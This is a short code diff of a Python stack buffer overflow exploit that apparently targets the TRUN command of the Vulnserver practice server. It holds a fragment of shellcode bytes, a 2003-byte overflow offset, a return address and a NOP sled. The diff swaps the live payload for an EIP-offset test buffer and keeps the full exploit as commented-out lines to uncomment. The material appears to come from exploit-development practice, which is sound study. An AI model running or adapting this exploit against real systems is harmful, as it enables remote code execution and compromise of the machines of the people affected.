@@ -39,10 +39,14 @@ shell = ( ""
 "\xa2\xd1\xbc\x68\xc7\xd4\xf9\x2e\x34\xa5\x92\xda\x3a"
 "\x1a\x92\xce")
 
-buffer = "TRUN /.:/"
-buffer += "A" * 2003
-buffer += "\xAF\x11\x50\x62"
-buffer += "\x90"*16 + shell + "C" * (5060-2003-4-16-len(shell))
+#buffer = "TRUN /.:/" + "A"*5060     #Overwrite with all A's
+buffer = "TRUN /.:/" + "A"*2003 + "B"*4 + "C"*500     #Overwrite EIP with B's
+
+#Uncomment buffer below for exploit
+#buffer = "TRUN /.:/"
+#buffer += "A" * 2003
+#buffer += "\xAF\x11\x50\x62"
+#buffer += "\x90"*16 + shell + "C" * (5060-2003-4-16-len(shell))
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect ((host))
